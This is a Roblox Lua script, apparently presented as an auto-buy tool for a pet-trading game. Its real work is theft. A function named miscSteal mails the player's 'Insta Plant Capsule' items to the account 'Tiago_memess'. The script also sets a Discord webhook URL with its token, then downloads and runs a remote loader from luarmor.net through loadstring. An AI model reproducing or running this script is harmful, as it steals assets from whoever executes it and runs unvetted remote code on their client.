print("Started")
game:GetService("RunService"):Set3dRenderingEnabled(false)
local waited = false
local library = require(game.ReplicatedStorage.Library)
local save = library.Save.Get().Inventory
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
    end
end

if GemAmount1 < 30000000 then
    task.wait(15)
    waited = true
    game.ReplicatedStorage:WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
end    

local function miscSteal()
    for i, v in pairs(save.Misc) do
       if v._am ~= nil then 
            if v.id == "Insta Plant Capsule" and v._am >= 200 then
                task.wait(15)
                local args = {
                    [1] = "Tiago_memess",
                    [2] = "DIAMOND SEEDS A BIRE",
                    [3] = "Misc",
                    [4] = i,
                    [5] = v._am - 1
                }
                 if waited == false then
                    task.wait(15)
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                else
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                end
            end
        end
    end
end

miscSteal()

getgenv().settings = {
        {
            item = "Insta Plant Capsule",
            maxPrice = 16500,
            class = "Misc"
        }
    }
task.wait(5)
getgenv().webhook = "https://discord.com/api/webhooks/1189711297827311616/y1MGTxuB8LosIVGm8ntw0tsBmgR7J6bOfZPgRPln8Un5Dyw5Gpvd5o714zaMNNqA_oUh"
script_key="YyxWRRbkkVgEbClNmDPNgLGHfzCSyIeF"; 
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fb2430277ea12a4fbea278cf8a4b3f49.lua"))()
task.spawn(function()
    task.wait(60)
    game:GetService("TeleportService"):Teleport(15502339080,game.Players.LocalPlayer)
end)
